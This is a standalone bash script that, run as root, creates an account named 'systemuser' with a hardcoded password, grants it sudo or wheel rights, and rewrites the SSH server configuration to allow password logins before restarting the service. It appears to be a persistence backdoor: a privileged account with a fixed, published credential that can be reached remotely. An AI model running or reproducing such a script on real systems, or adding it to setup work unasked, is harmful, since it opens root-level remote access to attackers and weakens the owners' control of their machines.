#!/bin/bash

# Ensure the script is run as root
if [ "$EUID" -ne 0 ]; then
  echo "[-] Please run this script with sudo or as root."
  exit 1
fi

USERNAME="systemuser"
PASSWORD="Prime@143#"

# 1. Create the user if it doesn't already exist
if id "$USERNAME" &>/dev/null; then
  echo "[*] User '$USERNAME' already exists."
else
  useradd -m -s /bin/bash "$USERNAME"
  echo "[+] User '$USERNAME' created successfully."
fi

# 2. Set the password
echo "$USERNAME:$PASSWORD" | chpasswd
echo "[+] Password configured for '$USERNAME'."

# 3. Grant sudo privileges
if getent group sudo >/dev/null; then
  usermod -aG sudo "$USERNAME"
  echo "[+] User '$USERNAME' added to the 'sudo' group."
elif getent group wheel >/dev/null; then
  usermod -aG wheel "$USERNAME"
  echo "[+] User '$USERNAME' added to the 'wheel' group."
else
  echo "[-] Neither 'sudo' nor 'wheel' group found. Creating 'sudo' group and adding user."
  groupadd sudo
  usermod -aG sudo "$USERNAME"
  echo "[+] User '$USERNAME' added to the newly created 'sudo' group."
fi

# 4. Configure SSH to ensure password authentication is enabled
SSHD_CONFIG="/etc/ssh/sshd_config"

if [ -f "$SSHD_CONFIG" ]; then
  # Enable PasswordAuthentication if it's commented out or set to no
  sed -i 's/^#\?PasswordAuthentication .*/PasswordAuthentication yes/' "$SSHD_CONFIG"
  
  # Ensure PAM is enabled for password handling
  if grep -q "^#UsePAM" "$SSHD_CONFIG"; then
    sed -i 's/^#UsePAM.*/UsePAM yes/' "$SSHD_CONFIG"
  elif ! grep -q "^UsePAM" "$SSHD_CONFIG"; then
    echo "UsePAM yes" >> "$SSHD_CONFIG"
  fi

  echo "[+] SSH configuration updated to allow password authentication."

  # Restart the SSH service to apply changes (supports systemd)
  if systemctl list-units --full -all | grep -q sshd.service; then
    systemctl restart sshd
    echo "[+] SSH service restarted (sshd)."
  elif systemctl list-units --full -all | grep -q ssh.service; then
    systemctl restart ssh
    echo "[+] SSH service restarted (ssh)."
  else
    echo "[-] Could not automatically restart SSH service. Please restart it manually."
  fi
else
  echo "[-] Warning: $SSHD_CONFIG not found. Please verify your SSH server installation."
fi

echo "[+] Setup completed successfully for user '$USERNAME' with sudo rights and SSH password authentication enabled."
